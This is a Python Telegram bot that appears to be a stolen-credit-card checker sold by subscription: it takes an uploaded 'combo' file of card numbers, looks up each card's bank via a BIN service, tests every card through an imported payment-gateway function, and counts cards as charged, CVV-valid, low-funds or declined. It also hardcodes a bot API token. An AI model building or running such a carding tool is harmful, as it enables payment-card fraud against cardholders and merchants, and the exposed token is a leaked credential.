import requests
import telebot, time
from telebot import types
from gatet import Tele
import os

token = '8299646020:AAHM7qDFRuBjcMRwFiLMwXMWxXxNs8mk0G4'
bot = telebot.TeleBot(token, parse_mode="HTML")

# ====== /start ======
@bot.message_handler(commands=["start"])
def start(message):
    if not (
        str(message.chat.id) == '1915369904'
        or str(message.chat.id) == '1915369904'
    ):
        bot.reply_to(
            message,
            "You cannot use the bot to contact developers to purchase a bot subscription @GFEMin"
        )
        return

    bot.reply_to(message, "Send the file now")

# ====== DOCUMENT ======
@bot.message_handler(content_types=["document"])
def main(message):
    if not (
        str(message.chat.id) == '1915369904'
        or str(message.chat.id) == '1915369904'
    ):
        bot.reply_to(
            message,
            "You cannot use the bot to contact developers to purchase a bot subscription @GFEMin"
        )
        return

    dd = 0
    live = 0
    ch = 0
    ccn = 0
    cvv = 0
    lowfund = 0

    ko = (bot.reply_to(message, "CHECKING....⌛").message_id)

    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)

            for cc in lino:
                current_dir = os.getcwd()
                for filename in os.listdir(current_dir):
                    if filename.endswith(".stop"):
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=ko,
                            text='𝐒𝐓𝐎𝐏 ✅\n𝐁𝐎𝐓 𝐁𝐘  ➜ @GFEMin'
                        )
                        os.remove('stop.stop')
                        return

                try:
                    data = requests.get(
                        'https://bins.antipublic.cc/bins/' + cc[:6]
                    ).json()
                except:
                    data = {}

                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', 'Unknown')
                bank = data.get('bank', 'Unknown')

                start_time = time.time()
                try:
                    last = str(Tele(cc))
                except Exception as e:
                    print(e)
                    last = 'missing payment form'

                mes = types.InlineKeyboardMarkup(row_width=1)
                mes.add(
                    types.InlineKeyboardButton(f"• {cc} •", callback_data='u8'),
                    types.InlineKeyboardButton(f"• STATUS ➜ {last} •", callback_data='u8'),
                    types.InlineKeyboardButton(f"• CHARGED ➜ [ {ch} ] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• CCN ➜ [ {ccn} ] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• CVV ➜ [ {cvv} ] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• LOW FUNDS ➜ [ {lowfund} ] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• DECLINED ➜ [ {dd} ] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• TOTAL ➜ [ {total} ] •", callback_data='x'),
                    types.InlineKeyboardButton("[ STOP ]", callback_data='stop')
                )

                execution_time = time.time() - start_time

                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=ko,
                    text='Wait For Processing\nby ➜ @GFEMin',
                    reply_markup=mes
                )

                if 'Payment Successful!' in last:
                    ch += 1

                elif 'Insufficient funds' in last:
                    lowfund += 1

                else:
                    dd += 1
                    time.sleep(3)

    except Exception as e:
        print(e)

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=ko,
        text='𝐂𝐇𝐄𝐂𝐊𝐄𝐃 ✅\n𝐁𝐎𝐓 𝐁𝐘 ➜ @GFEMin'
    )

# ====== STOP BUTTON ======
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    with open("stop.stop", "w") as file:
        pass

bot.polling()
